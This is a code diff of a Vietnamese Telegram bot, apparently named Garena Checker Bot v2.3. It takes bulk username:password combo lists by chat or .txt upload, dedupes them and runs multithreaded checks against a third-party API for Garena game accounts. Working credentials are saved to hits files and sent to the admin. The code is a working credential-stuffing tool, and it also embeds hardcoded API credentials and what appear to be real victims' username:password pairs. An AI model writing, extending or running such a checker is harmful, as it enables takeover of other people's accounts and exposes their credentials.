@@ -1,4 +1,4 @@
-# bot.py - GARENA CHECKER BOT - FULL FIX + DELAY API + TRA KET QUA
+# bot.py - GARENA CHECKER BOT - CHI LAY USER:PASS CHUAN
 import subprocess
 import sys
 import importlib
@@ -9,7 +9,6 @@ import os
 import re
 import telebot
 import requests
-import signal
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -44,7 +43,7 @@ class RenderHandler(BaseHTTPRequestHandler):
 <h1>Garena Checker Bot</h1>
 <p>Status: <b style="color:#00ff00;">ALIVE</b></p>
 <p>Admin: <a href="https://t.me/baohuyno1" style="color:#00ff00;">@baohuyno1</a></p>
-<p>Version: <b>2.1 - DELAY + RESULT</b></p>
+<p>Version: <b>2.3 - CHI LAY USER:PASS</b></p>
 </body>
 </html>"""
             self.wfile.write(html.encode('utf-8'))
@@ -81,10 +80,10 @@ API_BASE = "https://lol.nhatminh301.com"
 API_USERNAME = "thaituduc"
 API_PASSWORD = "thaituduc"
 
-DEFAULT_THREADS = 50  # Giam thread de tranh ban
+DEFAULT_THREADS = 50
 DEFAULT_TIMEOUT = 30
 DEFAULT_RETRIES = 3
-API_DELAY = 0.5  # Delay giua cac request (giay)
+API_DELAY = 0.5
 
 OUTPUT_HITS = "hits.txt"
 OUTPUT_DEAD = "dead.txt"
@@ -92,6 +91,7 @@ OUTPUT_FILTERED = "filtered_accounts.txt"
 OUTPUT_UNKNOWN = "unknown.txt"
 OUTPUT_ERROR = "error.txt"
 OUTPUT_RESULT = "result_full.txt"
+OUTPUT_CLEAN = "clean_accounts.txt"
 
 MAX_MESSAGE_LENGTH = 4000
 
@@ -143,7 +143,6 @@ stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown":
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
 bot_start_time = datetime.now()
-result_cache = []  # Cache kết quả để gửi sau
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
@@ -196,6 +195,7 @@ def create_main_keyboard():
         KeyboardButton("📥 Tai Hits"),
         KeyboardButton("📥 Tai Dead"),
         KeyboardButton("📥 Tai Ket Qua"),
+        KeyboardButton("📥 Tai Clean"),
         KeyboardButton("⏹ Dung check"),
         KeyboardButton("👤 Admin"),
         KeyboardButton("📋 Danh sach Service")
@@ -225,6 +225,7 @@ def create_admin_keyboard():
         InlineKeyboardButton("📥 Hits", callback_data="admin_hits"),
         InlineKeyboardButton("📥 Dead", callback_data="admin_dead"),
         InlineKeyboardButton("📥 Ket Qua", callback_data="admin_result"),
+        InlineKeyboardButton("📥 Clean", callback_data="admin_clean"),
         InlineKeyboardButton("⏹ Dung check", callback_data="admin_stop"),
         InlineKeyboardButton("🗑 Xoa pending", callback_data="admin_clear"),
         InlineKeyboardButton("📋 Danh sach service", callback_data="admin_services")
@@ -232,53 +233,117 @@ def create_admin_keyboard():
     keyboard.add(*buttons)
     return keyboard
 
-# ========== LỌC TK MK ==========
-def loc_tk_mk(content):
+# ========== LỌC TK MK CHỈ LẤY USER:PASS ==========
+def loc_tk_mk_clean(content):
+    """
+    Lọc chỉ lấy định dạng user:pass
+    Giữ nguyên định dạng như: ZzkeconzZ:thanhoppa2001
+    """
     accounts = []
     seen = set()
+    stats_loc = {
+        "total_lines": 0,
+        "valid": 0,
+        "invalid": 0,
+        "duplicate": 0
+    }
     
     if not content:
-        return accounts
+        return accounts, stats_loc
     
     lines = content.split('\n')
+    stats_loc["total_lines"] = len(lines)
     
     for line in lines:
         line = line.strip()
         if not line:
             continue
         
-        user = None
-        pwd = None
-        
-        separators = [':', '|', '/', '\t', ';', ' ']
-        for sep in separators:
-            if sep in line:
-                parts = line.split(sep, 1)
-                if len(parts) == 2:
-                    user = parts[0].strip()
-                    pwd = parts[1].strip()
-                    if user and pwd:
-                        break
-                    else:
-                        user = None
-                        pwd = None
-        
-        if not user or not pwd:
+        # Bỏ qua dòng quá dài hoặc quá ngắn
+        if len(line) < 3 or len(line) > 200:
+            stats_loc["invalid"] += 1
             continue
         
-        user_clean = re.sub(r'[^\w.@.-]', '', user)
-        pwd_clean = pwd.strip()
-        
-        if len(user_clean) > 0 and len(pwd_clean) > 0:
-            key = f"{user_clean}:{pwd_clean}"
-            if key not in seen:
-                seen.add(key)
-                accounts.append((user_clean, pwd_clean))
+        # Tìm dấu : đầu tiên
+        if ':' in line:
+            parts = line.split(':', 1)
+            if len(parts) == 2:
+                user = parts[0].strip()
+                pwd = parts[1].strip()
+                
+                # Kiểm tra user và pass hợp lệ
+                if user and pwd and len(user) >= 2 and len(pwd) >= 1:
+                    # Giữ nguyên user và pass, không thay đổi
+                    key = f"{user}:{pwd}"
+                    if key not in seen:
+                        seen.add(key)
+                        accounts.append((user, pwd))
+                        stats_loc["valid"] += 1
+                    else:
+                        stats_loc["duplicate"] += 1
+                else:
+                    stats_loc["invalid"] += 1
+            else:
+                stats_loc["invalid"] += 1
+        else:
+            stats_loc["invalid"] += 1
     
-    return accounts
+    return accounts, stats_loc
 
-# ========== CHECK API VỚI DELAY ==========
-def check_account_api_with_delay(username, password, service):
+# ========== HÀM LỌC TỪ FILE LỚN ==========
+def loc_file_lon(file_path):
+    """
+    Lọc file lớn từng dòng một
+    """
+    accounts = []
+    seen = set()
+    stats_loc = {
+        "total_lines": 0,
+        "valid": 0,
+        "invalid": 0,
+        "duplicate": 0
+    }
+    
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                stats_loc["total_lines"] += 1
+                line = line.strip()
+                if not line:
+                    continue
+                
+                if len(line) < 3 or len(line) > 200:
+                    stats_loc["invalid"] += 1
+                    continue
+                
+                # Tìm dấu :
+                if ':' in line:
+                    parts = line.split(':', 1)
+                    if len(parts) == 2:
+                        user = parts[0].strip()
+                        pwd = parts[1].strip()
+                        
+                        if user and pwd and len(user) >= 2 and len(pwd) >= 1:
+                            key = f"{user}:{pwd}"
+                            if key not in seen:
+                                seen.add(key)
+                                accounts.append((user, pwd))
+                                stats_loc["valid"] += 1
+                            else:
+                                stats_loc["duplicate"] += 1
+                        else:
+                            stats_loc["invalid"] += 1
+                    else:
+                        stats_loc["invalid"] += 1
+                else:
+                    stats_loc["invalid"] += 1
+    except Exception as e:
+        print(f"[!] Loi doc file: {e}")
+    
+    return accounts, stats_loc
+
+# ========== CHECK API ==========
+def check_account_api(username, password, service):
     route = SERVICE_ROUTES.get(service, {}).get("route", "/api/lienquan")
     url = f"{API_BASE}{route}"
     
@@ -289,17 +354,11 @@ def check_account_api_with_delay(username, password, service):
         "mk": password
     }
     
-    headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-        "Accept": "application/json"
-    }
-    
-    # Thêm delay trước khi gọi API
     time.sleep(API_DELAY)
     
     for attempt in range(DEFAULT_RETRIES):
         try:
-            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
+            resp = requests.get(url, params=params, timeout=DEFAULT_TIMEOUT)
             
             if resp.status_code == 200:
                 try:
@@ -317,147 +376,63 @@ def check_account_api_with_delay(username, password, service):
                     return data
                 except json.JSONDecodeError:
                     if "success" in resp.text.lower() or "ok" in resp.text.lower():
-                        return {"result": "hit", "raw": resp.text[:200]}
+                        return {"result": "hit"}
                     else:
-                        return {"result": "dead", "raw": resp.text[:200]}
+                        return {"result": "dead"}
             elif resp.status_code == 429:
                 time.sleep(5)
-            elif resp.status_code >= 500:
-                time.sleep(3)
             else:
                 time.sleep(1)
-        except requests.exceptions.Timeout:
-            time.sleep(2)
-        except requests.exceptions.ConnectionError:
-            time.sleep(3)
         except:
             time.sleep(2)
     
-    return {"result": "error", "message": "Request failed after retries"}
+    return {"result": "error"}
 
-# ========== FORMAT KẾT QUẢ CHI TIẾT ==========
-def format_result_detailed(username, password, data, service=""):
-    if isinstance(data, str):
-        try:
-            data = json.loads(data)
-        except:
-            pass
-    
-    if not isinstance(data, dict):
-        return {
-            "status": "hit" if "hit" in str(data).lower() else "unknown",
-            "username": username,
-            "password": password,
-            "service": service,
-            "info": {}
-        }
-    
-    # Lấy thông tin chi tiết
-    info = {
-        "uid": data.get("uid", data.get("id", "N/A")),
-        "name": data.get("name", data.get("nickname", data.get("aov_name", "N/A"))),
-        "region": data.get("region", data.get("country", "VN")),
-        "shells": data.get("shells", data.get("so", data.get("coins", 0))),
-        "rank": data.get("aov_rank", data.get("rank", data.get("tier", "N/A"))),
-        "level": data.get("aov_level", data.get("level", data.get("lv", 0))),
-        "skins": data.get("aov_total_skins", data.get("skin", data.get("skins", 0))),
-        "heroes": data.get("aov_total_champs", data.get("hero", data.get("champs", 0))),
-        "email": data.get("email", data.get("mail", "N/A")),
-        "phone": data.get("phone", data.get("mobile", "N/A"))
-    }
-    
-    result = {
-        "status": data.get("result", "unknown"),
-        "username": username,
-        "password": password,
-        "service": service,
-        "info": info
-    }
-    
-    return result
-
-def format_hit_text(result):
-    info = result["info"]
-    service_icon = SERVICE_ROUTES.get(result["service"], {}).get("icon", "🎮")
-    service_desc = SERVICE_ROUTES.get(result["service"], {}).get("desc", result["service"])
-    
-    return f"""
-{service_icon} ✅ HIT - {service_desc}
-🔑 {result['username']}:{result['password']}
-🆔 UID: {info['uid']}
-👤 Name: {info['name']}
-🌐 Region: {info['region']}
-💰 So: {info['shells']}
-👑 Rank: {info['rank']}
-✨ Level: {info['level']}
-💎 Skin: {info['skins']}
-⚔️ Hero: {info['heroes']}
-📧 Email: {info['email']}
-📱 Phone: {info['phone']}
-⏱ Time: {datetime.now().strftime('%H:%M:%S')}
-"""
-
-def format_dead_text(username, password, service=""):
-    service_icon = SERVICE_ROUTES.get(service, {}).get("icon", "🎮")
-    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
-    return f"""
-{service_icon} ❌ DEAD - {service_desc}
-🔑 {username}:{password}
-⏱ Time: {datetime.now().strftime('%H:%M:%S')}
-"""
-
-# ========== LƯU KẾT QUẢ CHI TIẾT ==========
-def save_result_detailed(result):
+# ========== LƯU KẾT QUẢ ==========
+def save_result(username, password, status, service=""):
     with file_lock:
-        # Lưu vào file kết quả đầy đủ
-        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
-            f.write(json.dumps(result, ensure_ascii=False) + '\n')
-        
-        # Lưu theo từng loại
-        status = result.get("status", "unknown")
-        user = result["username"]
-        pwd = result["password"]
-        service = result.get("service", "unknown")
-        
         if status == "hit":
             with open(OUTPUT_HITS, 'a', encoding='utf-8') as f:
-                f.write(f"{user}:{pwd}\n")
+                f.write(f"{username}:{password}\n")
         elif status == "dead":
             with open(OUTPUT_DEAD, 'a', encoding='utf-8') as f:
-                f.write(f"{user}:{pwd}\n")
+                f.write(f"{username}:{password}\n")
         elif status == "unknown":
             with open(OUTPUT_UNKNOWN, 'a', encoding='utf-8') as f:
-                f.write(f"{user}:{pwd}\n")
+                f.write(f"{username}:{password}\n")
         else:
             with open(OUTPUT_ERROR, 'a', encoding='utf-8') as f:
-                f.write(f"{user}:{pwd}\n")
+                f.write(f"{username}:{password}\n")
+        
+        # Lưu kết quả chi tiết
+        with open(OUTPUT_RESULT, 'a', encoding='utf-8') as f:
+            f.write(f"{username}:{password}|{status}|{service}\n")
 
-# ========== CHECK ĐƠN CÓ KẾT QUẢ ==========
-def check_single_with_result(chat_id, username, password, service="lienquan"):
+# ========== CHECK ĐƠN ==========
+def check_single(chat_id, username, password, service="lienquan"):
     service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
     safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
     
-    raw_result = check_account_api_with_delay(username, password, service)
-    result_type = raw_result.get("result", "unknown")
+    result = check_account_api(username, password, service)
+    result_type = result.get("result", "unknown")
     
-    result = format_result_detailed(username, password, raw_result, service)
-    result["status"] = result_type
+    save_result(username, password, result_type, service)
     
-    # Lưu kết quả
-    save_result_detailed(result)
-    
-    # Gửi kết quả
     if result_type == "hit":
-        safe_send_message(chat_id, format_hit_text(result))
+        safe_send_message(chat_id, f"""
+✅ HIT - {service_desc}
+🔑 {username}:{password}
+""")
     elif result_type == "dead":
-        safe_send_message(chat_id, format_dead_text(username, password, service))
-    elif result_type == "unknown":
-        safe_send_message(chat_id, f"⚠️ UNKNOWN - {service.upper()}\n🔑 {username}:{password}\n❓ Khong xac dinh")
+        safe_send_message(chat_id, f"""
+❌ DEAD - {service_desc}
+🔑 {username}:{password}
+""")
     else:
-        safe_send_message(chat_id, f"⚠️ ERROR - {service.upper()}\n🔑 {username}:{password}\n❌ Loi khi check")
+        safe_send_message(chat_id, f"⚠️ ERROR - {service_desc}\n🔑 {username}:{password}")
 
-# ========== CHECK NHIỀU CÓ KẾT QUẢ ==========
-def check_batch_with_result(chat_id, accounts, service):
+# ========== CHECK NHIỀU ==========
+def check_batch(chat_id, accounts, service):
     global checking, stats
     
     if checking:
@@ -487,21 +462,16 @@ def check_batch_with_result(chat_id, accounts, service):
 🎯 Service: <b>{service_desc}</b>
 ⚡ Threads: <code>{DEFAULT_THREADS}</code>
 ⏱ Delay: <code>{API_DELAY}s</code>
-⏱ Bat dau: {datetime.now().strftime('%H:%M:%S')}
 """)
     
     def process_single(user, pwd):
         if stop_event.is_set():
             return
         
-        raw_result = check_account_api_with_delay(user, pwd, service)
-        result_type = raw_result.get("result", "unknown")
+        result = check_account_api(user, pwd, service)
+        result_type = result.get("result", "unknown")
         
-        result = format_result_detailed(user, pwd, raw_result, service)
-        result["status"] = result_type
-        
-        # Lưu kết quả
-        save_result_detailed(result)
+        save_result(user, pwd, result_type, service)
         
         with stats_lock:
             stats["checked"] += 1
@@ -509,17 +479,15 @@ def check_batch_with_result(chat_id, accounts, service):
             if result_type == "hit":
                 stats["hits"] += 1
                 try:
-                    safe_send_message(chat_id, format_hit_text(result))
+                    safe_send_message(chat_id, f"✅ HIT - {service_desc}\n🔑 {user}:{pwd}")
                 except:
                     pass
             elif result_type == "dead":
                 stats["dead"] += 1
-            elif result_type == "unknown":
-                stats["unknown"] += 1
             else:
                 stats["errors"] += 1
             
-            # Cập nhật tiến độ mỗi 20 accounts
+            # Cập nhật tiến độ
             if stats["checked"] % 20 == 0:
                 try:
                     elapsed = time.time() - stats["start_time"]
@@ -530,7 +498,6 @@ def check_batch_with_result(chat_id, accounts, service):
 ✅ Checked: <code>{stats['checked']}/{total}</code> ({percent:.1f}%)
 🔴 Hits: <code>{stats['hits']}</code>
 ❌ Dead: <code>{stats['dead']}</code>
-❓ Unknown: <code>{stats['unknown']}</code>
 ⚠️ Errors: <code>{stats['errors']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s
 """)
@@ -554,25 +521,24 @@ def check_batch_with_result(chat_id, accounts, service):
 📊 Tong: <code>{stats['total']}</code>
 🔴 HIT: <code>{stats['hits']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
-❓ UNKNOWN: <code>{stats['unknown']}</code>
 ⚠️ Errors: <code>{stats['errors']}</code>
 ⏱ Thoi gian: <code>{elapsed:.1f}s</code>
 ⚡ Toc do: <code>{stats['total']/elapsed:.1f}</code> acc/s
 """
     safe_send_message(chat_id, result_msg)
     
-    # Gửi file kết quả tổng hợp
-    if os.path.exists(OUTPUT_RESULT):
-        try:
-            with open(OUTPUT_RESULT, 'rb') as f:
-                bot.send_document(chat_id, f, caption=f"📊 result_full.txt (Tong: {stats['total']})")
-        except:
-            pass
+    # Gửi file kết quả
+    if stats["hits"] > 0 and os.path.exists(OUTPUT_HITS):
+        with open(OUTPUT_HITS, 'rb') as f:
+            try:
+                bot.send_document(chat_id, f, caption=f"✅ hits.txt ({stats['hits']} acc)")
+            except:
+                pass
 
 # ========== XỬ LÝ CALLBACK ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    global pending_accounts, filtered_accounts, checking
+    global pending_accounts
     
     if not is_admin(call.message.chat.id):
         bot.answer_callback_query(call.id, "❌ Ban khong co quyen!")
@@ -592,19 +558,15 @@ def handle_callback(call):
         except:
             pass
         
-        service_desc = SERVICE_ROUTES[service]["desc"]
-        icon = SERVICE_ROUTES[service]["icon"]
-        
         if pending_accounts:
             accounts = pending_accounts
             pending_accounts = []
             
             if len(accounts) == 1:
                 user, pwd = accounts[0]
-                threading.Thread(target=check_single_with_result, args=(call.message.chat.id, user, pwd, service)).start()
+                threading.Thread(target=check_single, args=(call.message.chat.id, user, pwd, service)).start()
             else:
-                filtered_accounts = accounts
-                threading.Thread(target=check_batch_with_result, args=(call.message.chat.id, accounts, service)).start()
+                threading.Thread(target=check_batch, args=(call.message.chat.id, accounts, service)).start()
         else:
             bot.answer_callback_query(call.id, "❌ Khong co accounts de check!")
     
@@ -618,10 +580,8 @@ def handle_callback(call):
 ✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
 🔴 HIT: <code>{stats['hits']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
-❓ UNKNOWN: <code>{stats['unknown']}</code>
 ⚠️ Errors: <code>{stats['errors']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s
-⏱ Delay: <code>{API_DELAY}s</code>
 """)
         else:
             safe_send_message(call.message.chat.id, "💤 Bot dang ranh")
@@ -649,6 +609,14 @@ def handle_callback(call):
                 bot.send_document(call.message.chat.id, f, caption="📊 result_full.txt")
         except:
             safe_send_message(call.message.chat.id, "❌ Chua co ket qua!")
+        bot.answer_callback_query(call.id)
+    
+    elif data == "admin_clean":
+        try:
+            with open(OUTPUT_CLEAN, 'rb') as f:
+                bot.send_document(call.message.chat.id, f, caption="📥 clean_accounts.txt")
+        except:
+            safe_send_message(call.message.chat.id, "❌ Chua co clean!")
         bot.answer_callback_query(call.id)
     
     elif data == "admin_stop":
@@ -682,23 +650,22 @@ def handle_text(message):
     
     text = message.text.strip()
     
-    # XỬ LÝ NÚT BẤM
     if text == "📝 Gui TK MK":
         safe_send_message(message.chat.id, """
 📌 <b>GUI TK MK</b>
-Gui truc tiep <code>user:pass</code> hoac nhieu accounts
+Gui truc tiep <code>user:pass</code>
 
 VD:
-<code>user1:pass123</code>
-<code>user2:pass456</code>
-<code>user3:pass789</code>
+<code>ZzkeconzZ:thanhoppa2001</code>
+<code>anhduckim1:kimanhduc1</code>
+<code>trannamtrungzzz:cuong2001</code>
 """)
         return
     
     elif text == "📁 Gui File TXT":
         safe_send_message(message.chat.id, """
 📌 <b>GUI FILE TXT</b>
-Gui file .txt chua danh sach tk mk
+Gui file .txt chua danh sach
 Bot se tu dong loc va check!
 """)
         return
@@ -706,16 +673,7 @@ Bot se tu dong loc va check!
     elif text == "🔍 Loc TK MK tu TXT":
         safe_send_message(message.chat.id, """
 🔍 <b>LOC TK MK TU TXT</b>
-
-📌 Gui file .txt chua danh sach tai khoan
-Bot se loc chi giu lai <code>user:pass</code>
-
-📌 Ho tro dinh dang:
-• <code>user:pass</code>
-• <code>user|pass</code>
-• <code>user/pass</code>
-
-📌 Sau khi loc xong, chon service de check!
+Gui file .txt de loc chi lay <code>user:pass</code>
 """)
         return
     
@@ -729,10 +687,8 @@ Bot se loc chi giu lai <code>user:pass</code>
 ✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
 🔴 HIT: <code>{stats['hits']}</code>
 ❌ DEAD: <code>{stats['dead']}</code>
-❓ UNKNOWN: <code>{stats['unknown']}</code>
 ⚠️ Errors: <code>{stats['errors']}</code>
 ⚡ Speed: <code>{speed:.1f}</code> acc/s
-⏱ Delay: <code>{API_DELAY}s</code>
 """)
         else:
             safe_send_message(message.chat.id, "💤 Bot dang ranh")
@@ -762,6 +718,14 @@ Bot se loc chi giu lai <code>user:pass</code>
             safe_send_message(message.chat.id, "❌ Chua co ket qua!")
         return
     
+    elif text == "📥 Tai Clean":
+        try:
+            with open(OUTPUT_CLEAN, 'rb') as f:
+                bot.send_document(message.chat.id, f, caption="📥 clean_accounts.txt")
+        except:
+            safe_send_message(message.chat.id, "❌ Chua co clean!")
+        return
+    
     elif text == "⏹ Dung check":
         stop_event.set()
         checking = False
@@ -773,13 +737,6 @@ Bot se loc chi giu lai <code>user:pass</code>
 👤 <b>ADMIN</b>
 📌 Admin: @baohuyno1
 🔗 Lien he: https://t.me/baohuyno1
-
-📋 <b>CHUC NANG ADMIN:</b>
-• Quan ly bot
-• Xem trang thai
-• Tai hits/dead/ketqua
-• Dung check
-• Xoa pending
 """, reply_markup=create_admin_keyboard())
         return
     
@@ -787,33 +744,41 @@ Bot se loc chi giu lai <code>user:pass</code>
         msg = "📋 <b>DANH SACH SERVICE</b>\n\n"
         for key, value in SERVICE_ROUTES.items():
             msg += f"{value['icon']} <b>{value['desc']}</b>\n"
-            msg += f"   Route: <code>{value['route']}</code>\n\n"
         safe_send_message(message.chat.id, msg)
         return
     
     if text.startswith('/'):
         return
     
-    # XỬ LÝ TK MK
-    accounts = loc_tk_mk(text)
+    # XỬ LÝ TK MK - Lọc sạch
+    accounts, stats_loc = loc_tk_mk_clean(text)
     
     if not accounts:
         safe_send_message(message.chat.id, """
 ❌ <b>KHONG TIM THAY!</b>
-Format dung: <code>user:pass</code> hoac <code>user|pass</code> hoac <code>user/pass</code>
+Format dung: <code>user:pass</code>
 
-📌 Vi du:
+VD:
 <code>ZzkeconzZ:thanhoppa2001</code>
+<code>anhduckim1:kimanhduc1</code>
 """)
         return
     
     pending_accounts = accounts
+    
+    # Lưu clean
+    with open(OUTPUT_CLEAN, 'w', encoding='utf-8') as f:
+        for user, pwd in accounts:
+            f.write(f"{user}:{pwd}\n")
     
     preview = '\n'.join([f"{u}:{p}" for u, p in accounts[:10]])
     total = len(accounts)
     
     msg = f"""
 📌 <b>DA NHAN {total} ACCOUNTS</b>
+✅ Valid: {stats_loc['valid']}
+❌ Invalid: {stats_loc['invalid']}
+🔄 Duplicate: {stats_loc['duplicate']}
 
 <b>Preview (10 dong dau):</b>
 <code>{preview}</code>
@@ -839,7 +804,9 @@ def handle_document(message):
         
         file_info = bot.get_file(message.document.file_id)
         content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
-        accounts = loc_tk_mk(content)
+        
+        # Lọc chỉ lấy user:pass
+        accounts, stats_loc = loc_tk_mk_clean(content)
         
         if not accounts:
             safe_send_message(message.chat.id, "❌ Khong tim thay user:pass trong file!")
@@ -847,7 +814,8 @@ def handle_document(message):
         
         pending_accounts = accounts
         
-        with open(OUTPUT_FILTERED, 'w', encoding='utf-8') as f:
+        # Lưu file clean
+        with open(OUTPUT_CLEAN, 'w', encoding='utf-8') as f:
             for user, pwd in accounts:
                 f.write(f"{user}:{pwd}\n")
         
@@ -857,6 +825,9 @@ def handle_document(message):
         msg = f"""
 ✅ <b>LOC XONG!</b>
 📊 Tong: <code>{total}</code> accounts
+✅ Valid: {stats_loc['valid']}
+❌ Invalid: {stats_loc['invalid']}
+🔄 Duplicate: {stats_loc['duplicate']}
 
 <b>Preview (20 dong dau):</b>
 <code>{preview}</code>
@@ -880,11 +851,10 @@ def cmd_start(message):
     hours = uptime.seconds // 3600
     minutes = (uptime.seconds % 3600) // 60
     
-    try:
-        bot.send_message(
-            message.chat.id,
-            f"""
-🤖 <b>GARENA CHECKER BOT V2.1</b>
+    bot.send_message(
+        message.chat.id,
+        f"""
+🤖 <b>GARENA CHECKER BOT V2.3</b>
 👤 Admin: <a href="https://t.me/baohuyno1">@baohuyno1</a>
 ⏱ Uptime: <code>{hours}h {minutes}m</code>
 ⏱ Delay API: <code>{API_DELAY}s</code>
@@ -896,4 +866,170 @@ Gui truc tiep <code>user:pass</code>
 → Chon service bang nut bam
 
 2️⃣ <b>GUI FILE TXT</b>
-Gui file .txt chua danh
+Gui file .txt chua danh sach
+→ Chon service bang nut bam
+
+3️⃣ <b>LOC TK MK TU TXT</b>
+Nhan nut <b>"🔍 Loc TK MK tu TXT"</b>
+→ Gui file .txt de loc
+
+📌 <b>DINH DANG:</b>
+<code>user:pass</code>
+
+VD:
+<code>ZzkeconzZ:thanhoppa2001</code>
+<code>anhduckim1:kimanhduc1</code>
+<code>trannamtrungzzz:cuong2001</code>
+
+⚡ <b>THREADS:</b> {DEFAULT_THREADS}
+📋 <b>SERVICES:</b> {', '.join(SERVICE_ROUTES.keys())}
+
+💡 <b>BOT 24/7 - LUON SAN SANG</b>
+""",
+        reply_markup=create_main_keyboard()
+    )
+
+# ========== LỆNH /help ==========
+@bot.message_handler(commands=['help'])
+def cmd_help(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    safe_send_message(
+        message.chat.id,
+        f"""
+📌 <b>HUONG DAN SU DUNG</b>
+
+<b>1. CHECK DON:</b>
+Gui truc tiep: <code>user:pass</code>
+→ Chon service
+
+<b>2. CHECK HANG LOAT:</b>
+Gui file .txt hoac nhieu accounts
+→ Chon service
+
+<b>3. LOC TK MK:</b>
+Nhan nut <b>"🔍 Loc TK MK tu TXT"</b>
+→ Gui file .txt
+
+<b>4. CAC LENH:</b>
+<code>/start</code> - Khoi dong bot
+<code>/help</code> - Huong dan
+<code>/status</code> - Xem trang thai
+<code>/stop</code> - Dung check
+<code>/hits</code> - Tai hits.txt
+<code>/dead</code> - Tai dead.txt
+<code>/clear</code> - Xoa pending
+
+<b>5. HO TRO:</b>
+👤 Admin: @baohuyno1
+""",
+        reply_markup=create_main_keyboard()
+    )
+
+@bot.message_handler(commands=['status'])
+def cmd_status(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    if checking:
+        elapsed = time.time() - stats.get("start_time", time.time())
+        speed = stats["checked"] / elapsed if elapsed > 0 else 0
+        safe_send_message(message.chat.id, f"""
+📊 <b>TRANG THAI</b>
+🔄 Dang check: <b>YES</b>
+✅ Checked: <code>{stats['checked']}/{stats['total']}</code>
+🔴 HIT: <code>{stats['hits']}</code>
+❌ DEAD: <code>{stats['dead']}</code>
+⚠️ Errors: <code>{stats['errors']}</code>
+⚡ Speed: <code>{speed:.1f}</code> acc/s
+""")
+    else:
+        safe_send_message(message.chat.id, "💤 Bot dang ranh")
+
+@bot.message_handler(commands=['stop'])
+def cmd_stop(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    global checking
+    stop_event.set()
+    checking = False
+    safe_send_message(message.chat.id, "🛑 Da dung check!")
+
+@bot.message_handler(commands=['hits'])
+def cmd_hits(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    try:
+        with open(OUTPUT_HITS, 'rb') as f:
+            bot.send_document(message.chat.id, f, caption="✅ hits.txt")
+    except:
+        safe_send_message(message.chat.id, "❌ Chua co hits!")
+
+@bot.message_handler(commands=['dead'])
+def cmd_dead(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    try:
+        with open(OUTPUT_DEAD, 'rb') as f:
+            bot.send_document(message.chat.id, f, caption="❌ dead.txt")
+    except:
+        safe_send_message(message.chat.id, "❌ Chua co dead!")
+
+@bot.message_handler(commands=['clear'])
+def cmd_clear(message):
+    if not is_admin(message.chat.id):
+        return
+    
+    global pending_accounts
+    pending_accounts = []
+    safe_send_message(message.chat.id, "✅ Da xoa danh sach pending!")
+
+# ========== MAIN ==========
+def main():
+    print("=" * 60)
+    print("    GARENA CHECKER BOT V2.3")
+    print("    ADMIN: @baohuyno1")
+    print("    CHI LAY DINH DANG USER:PASS")
+    print("=" * 60)
+    print(f"[*] Threads: {DEFAULT_THREADS}")
+    print(f"[*] Delay: {API_DELAY}s")
+    print(f"[*] Services: {len(SERVICE_ROUTES)}")
+    print("=" * 60)
+    
+    try:
+        bot.send_message(ADMIN_CHAT_ID, """
+🤖 Bot da khoi dong V2.3!
+
+📌 CHI LAY DINH DANG: user:pass
+VD: ZzkeconzZ:thanhoppa2001
+
+👤 Admin: @baohuyno1
+""")
+    except:
+        pass
+    
+    print("[*] Bot dang chay 24/7...")
+    
+    while True:
+        try:
+            bot.polling(none_stop=True, interval=1, timeout=30)
+        except Exception as e:
+            error_msg = str(e)
+            if "409" in error_msg or "Conflict" in error_msg:
+                print("[!] Loi 409 Conflict - Dang khoi dong lai...")
+                time.sleep(5)
+                continue
+            else:
+                print(f"[!] Loi: {e}")
+                time.sleep(5)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n[!] Bot dung!")
+        sys.exit(0)
